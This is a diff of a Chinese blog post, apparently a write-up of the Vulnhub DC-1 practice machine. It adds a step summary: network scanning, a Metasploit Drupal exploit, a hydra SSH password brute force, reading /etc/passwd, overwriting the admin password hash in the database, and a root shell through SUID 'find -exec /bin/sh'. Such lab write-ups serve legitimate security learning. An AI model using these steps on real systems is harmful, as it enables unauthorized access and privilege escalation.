@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="靶机,">
+  <meta name="keywords" content="Vulnhnb,DC,">
 
 
 
@@ -80,7 +80,7 @@
 
 
 <meta name="description" content="比赛前几天学习靶机渗透...">
-<meta name="keywords" content="靶机">
+<meta name="keywords" content="Vulnhnb,DC">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Vulnhub DC靶机实践">
 <meta property="og:url" content="http://yoursite.com/2019/10/14/Vulnhub DC-1/index.html">
@@ -105,9 +105,12 @@
 <meta property="og:image" content="https://i.loli.net/2019/10/14/BnjPJDFMCVhIUY7.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/14/YBoVDJk5KGCWstx.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/14/gN4USrIVJ2WbPDX.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/14/xaUEl9KefM18HiP.png">
 <meta property="og:image" content="https://i.loli.net/2019/10/14/adJXBGhlunfiFjw.png">
-<meta property="og:image" content="https://i.loli.net/2019/10/14/1wYzvhPTeQjKmFl.png">
-<meta property="og:updated_time" content="2019-10-14T05:06:54.274Z">
+<meta property="og:image" content="https://i.loli.net/2019/10/14/4FmtCboAPnUjf8i.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/14/hXKulnJAjt8mq91.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/14/XgsUQMR9Llh8JAz.png">
+<meta property="og:updated_time" content="2019-10-17T04:15:57.995Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Vulnhub DC靶机实践">
 <meta name="twitter:description" content="比赛前几天学习靶机渗透...">
@@ -321,8 +324,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-10-14T13:06:54+08:00">
-                2019-10-14
+              <time title="Post modified" itemprop="dateModified" datetime="2019-10-17T12:15:57+08:00">
+                2019-10-17
               </time>
             
           </span>
@@ -391,7 +394,9 @@
       
 
       
-        <h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><p>靶机下载地址：<br><a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-1,292/</a><br>下载后用vm打开,打开的时候默认的是桥接模式,因我的kali使用的是NAT，所以DC-1需要改成NAT<br><img src="https://i.loli.net/2019/10/14/ZVQL9K5jBEbFCmy.png" alt="_9QEXS81US___U__3~LN9FE.png"></p>
+        <h1 id="DC-1过程总结"><a href="#DC-1过程总结" class="headerlink" title="DC-1过程总结"></a>DC-1过程总结</h1><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">查找目标ip：     arp-<span class="built_in">scan</span> -l</span><br><span class="line">全端口扫描：   nmap -sV -p- <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span></span><br><span class="line">查找框架漏洞： msfconsose -&gt; search Drupal -&gt;use 漏洞名称</span><br><span class="line">   （drupal中的配置文件默认在 sites/defult/settings.php）</span><br><span class="line">用户数据库：   cat /etc/passwd</span><br><span class="line">用户密码使用hydra+john the ripper爆破: hydra -l flag4 -P /root/john<span class="number">-1.8</span><span class="number">.0</span>/run/password.lst ssh:<span class="comment">//192.168.128.139</span></span><br><span class="line">ssh远程连接：  ssh flag4@<span class="number">192.168</span><span class="number">.128</span><span class="number">.139</span></span><br><span class="line">mysql登陆：   mysql -u dbuser -p  -&gt;输入数据库密码</span><br><span class="line">数据库： <span class="built_in">show</span> databases;</span><br><span class="line">        use drupaldb;</span><br><span class="line">        <span class="built_in">show</span> <span class="built_in">tables</span>;</span><br><span class="line">        <span class="keyword">select</span> * <span class="keyword">from</span> users;</span><br><span class="line">    (Drupal密码重置)<span class="keyword">update</span> users <span class="built_in">set</span> pass='$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9<span class="number">.8</span>M/D9okW7J/s5U4' <span class="built_in">where</span> uid=<span class="number">1</span>;</span><br><span class="line">SUID提权：    find / -<span class="built_in">type</span> f -perm -u=s <span class="number">2</span>&gt;/<span class="built_in">dev</span>/<span class="built_in">null</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><p>靶机下载地址：<br><a href="https://www.vulnhub.com/entry/dc-1,292/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-1,292/</a><br>下载后用vm打开,打开的时候默认的是桥接模式,因我的kali使用的是NAT，所以DC-1需要改成NAT<br><img src="https://i.loli.net/2019/10/14/ZVQL9K5jBEbFCmy.png" alt="_9QEXS81US___U__3~LN9FE.png"></p>
 <h2 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h2><p><img src="https://i.loli.net/2019/10/14/8g2twL4Szhy7o6e.png" alt="4_Y3ME6S`TE2EOFWH_0QP7O.png"></p>
 <h2 id="查找主机ip"><a href="#查找主机ip" class="headerlink" title="查找主机ip"></a>查找主机ip</h2><blockquote>
 <p>arp-scan -l</p>
@@ -426,8 +431,20 @@
 <p><img src="https://i.loli.net/2019/10/14/gN4USrIVJ2WbPDX.png" alt="~5_P_HPYCZ5_M__@DR4~8I2.png"><br>得到admin的账号和密码，但是密码已经加密，重置drupal的密码，把管理员的密码字段改成  </p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$S</span><span class="variable">$CDbdwZvjHQ09IVRs88G0fnaxPr50</span><span class="regexp">/kb81YI9.8M/</span>D9okW7J<span class="regexp">/s5U4</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2019/10/14/adJXBGhlunfiFjw.png" alt="UEC_8`NZ_26UOYYMQAQE_MF.png"></p>
-<p><img src="https://i.loli.net/2019/10/14/1wYzvhPTeQjKmFl.png" alt="`XMOVOQ6_5~2_0_VO_V27OL.png"></p>
+<p><img src="https://i.loli.net/2019/10/14/xaUEl9KefM18HiP.png" alt="S__RJ_V9I6_2LXPV3__M7LD.png"></p>
+<p>利用admin-password在网页进行登陆，浏览一下，即可发现flag3<br><img src="https://i.loli.net/2019/10/14/adJXBGhlunfiFjw.png" alt="UEC_8`NZ_26UOYYMQAQE_MF.png"><br><img src="https://i.loli.net/2019/10/14/4FmtCboAPnUjf8i.png" alt="S1MQF_665HFRX_~PI65KR_J.png"></p>
+<h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>suid提权：可以让调用者以文件拥有者的身份运行该文件。<br>使用命令</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -type f -perm <span class="attribute">-u</span>=s 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/10/14/hXKulnJAjt8mq91.png" alt="68S@SCS_BE_AW@WPW2152V8.png"><br>可运行的所有SUID可执行文件</p>
+<blockquote>
+<p>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000-print2&gt;/dev/null<br>find / -user root -perm -4000-exec ls -ldb {} ;</p>
+</blockquote>
+<p>随便找一个命令进行利用，就找find，发现其确实是root用户权限的SUID的文件</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~$ touch getflag  <span class="comment">//创建一个文件</span></span><br><span class="line">~$ <span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"whoami"</span> \;  <span class="comment">//通过find..exec 查找文件后并执行命令</span></span><br><span class="line">root</span><br><span class="line">~$ <span class="built_in">find</span> / -<span class="built_in">type</span> f -<span class="built_in">name</span> getflag -<span class="built_in">exec</span> <span class="string">"/bin/sh"</span> \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/10/14/XgsUQMR9Llh8JAz.png" alt="0VCSD8~6C_W_2__WDR8T_OY.png"></p>
+<p>成功提权。</p>
 
       
     </div>
@@ -445,7 +462,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/靶机/" rel="tag"># 靶机</a>
+            <a href="/tags/Vulnhnb/" rel="tag"># Vulnhnb</a>
+          
+            <a href="/tags/DC/" rel="tag"># DC</a>
           
         </div>
       
@@ -607,7 +626,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-1"><span class="nav-number">1.</span> <span class="nav-text">DC-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#靶机"><span class="nav-number">1.1.</span> <span class="nav-text">靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查找主机ip"><span class="nav-number">1.2.</span> <span class="nav-text">查找主机ip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查找漏洞"><span class="nav-number">1.3.</span> <span class="nav-text">查找漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#idea-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">idea 1</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-1过程总结"><span class="nav-number">1.</span> <span class="nav-text">DC-1过程总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-1"><span class="nav-number">2.</span> <span class="nav-text">DC-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#靶机"><span class="nav-number">2.1.</span> <span class="nav-text">靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查找主机ip"><span class="nav-number">2.2.</span> <span class="nav-text">查找主机ip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查找漏洞"><span class="nav-number">2.3.</span> <span class="nav-text">查找漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#idea-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">idea 1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#suid提权"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">suid提权</span></a></li></ol></li></ol></li></ol></li></ol></div>
             
 
           </div>
